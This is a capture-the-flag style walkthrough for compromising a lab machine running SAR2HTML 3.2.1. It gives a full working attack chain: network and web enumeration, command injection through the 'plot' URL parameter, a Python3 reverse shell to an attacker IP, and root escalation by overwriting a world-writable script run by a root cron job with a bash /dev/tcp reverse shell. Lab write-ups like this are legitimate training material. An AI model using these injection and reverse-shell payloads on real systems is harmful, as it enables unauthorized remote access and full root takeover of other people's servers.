# 🚩 SAR2HTML Exploitation and Privilege Escalation

## 🎯 Objective

Gain **remote shell access** to a vulnerable SAR2HTML web application, and then **escalate privileges to root** by exploiting a writable shell script executed via a cron job.

---

## 🔍 Step 1: Network Discovery

### 🔹 Discover Target IP

```bash
netdiscover -r 10.0.2.0/24
```

- Found target machine at: `10.0.2.6`

---

## 🔎 Step 2: Port Scanning

### 🔹 Run Nmap for Open Ports & Service Detection

```bash
nmap -A 10.0.2.6
```

- Found open port: **80 (HTTP)**

---

## 🌐 Step 3: Web Enumeration

### 🔹 Use Gobuster to Find Hidden Directories

```bash
gobuster dir -u http://10.0.2.6 -w /usr/share/wordlists/dirb/common.txt
```

- Found: `/robots.txt`

### 🔹 robots.txt Content

```text
Disallow: /sar2HTML/
```

---

## 📁 Step 4: SAR2HTML Enumeration

- URL: `http://10.0.2.6/sar2HTML/`
- Detected **SAR2HTML v3.2.1**
- Vulnerable to **Remote Code Execution** via `plot` parameter

---

## 🧪 Step 5: Confirm Remote Code Execution

### Test RCE:

```http
http://10.0.2.6/sar2HTML/index.php?plot=;whoami
```

- Response: `www-data` (confirms RCE)

---

## 🎯 Step 6: Get a Reverse Shell

[Parallel Way to Gain Access](./Parallel%20Way%20to%20Gain%20Access%20to%20sar2html%20Machine(METASPLOIT).md)



### Start Listener on Attacker Machine:

```bash
nc -lvnp 4444
```

### Exploit with Python3 Reverse Shell:

```http
http://10.0.2.6/sar2HTML/index.php?plot=;python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect(("10.0.2.5",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'
```

> Replace `10.0.2.5` with your Kali IP. Use URL encoding if needed.

---

## 📦 Step 7: Post-Exploitation Enumeration

### Check Kernel Version

```bash
uname -r
```

- `5.0.0-23-generic`

### Find SUID Binaries

```bash
find / -type f -perm -04000 -ls 2>/dev/null
```

(No unusual binaries found for direct root exploit.)

---

## ⏱️ Step 8: Privilege Escalation via Cron Job

### Check Crontab

```bash
cat /etc/crontab
```

- Found interesting line:

```cron
*/5 * * * * root cd /var/www/html/ && sudo ./finally.sh
```

### View Script Contents

```bash
cat /var/www/html/finally.sh
```

```bash
#!/bin/sh
./write.sh
```

### Check Permissions on write.sh

```bash
ls -l /var/www/html/write.sh
```

- Result:

```bash
-rwxrwxrwx 1 www-data www-data 30 Oct 21  2019 write.sh
```

✅ Writable by `www-data`, and **executed by root via cron** → escalation vector.

---

## 🧨 Step 9: Modify Script to Spawn Root Shell

### Replace `write.sh` with Reverse Shell Payload:

On attack box, start listener:

```bash
nc -lvnp 1234
```

On target (remote shell):

```bash
echo '#!/bin/bash' > /var/www/html/write.sh
echo 'bash -i >& /dev/tcp/192.168.1.107/1234 0>&1' >> /var/www/html/write.sh
chmod +x /var/www/html/write.sh
```

Wait for cron to execute.

### ✅ Root Access Achieved

- Listener receives connection as `root`.

---

## ✅ Summary

| Step | Action |
|------|--------|
| Web RCE | Exploit SAR2HTML via `plot` param |
| Initial Shell | Python3 reverse shell |
| PrivEsc | Overwrite cron-executed `write.sh` |
| Final Shell | Got root reverse shell via cron |

---

## 🔑 Key Techniques Used

- Web Enumeration (Gobuster, robots.txt)
- RCE via unsanitized GET param
- Reverse Shell via Python
- Cron job privilege escalation
- Shell replacement using writable scripts

---

## 🧰 Tools Used

- `netdiscover`
- `nmap`
- `gobuster`
- `nc` (Netcat)
- Bash scripting
- Python3 reverse shell

---

## 📝 Notes

- If `bash -i >& /dev/tcp/...` fails, use full Python shell or encode URL
- Always check crontabs and SUID files during enumeration
- Try `linpeas.sh` or `pspy` for automated detection in real CTFs

---
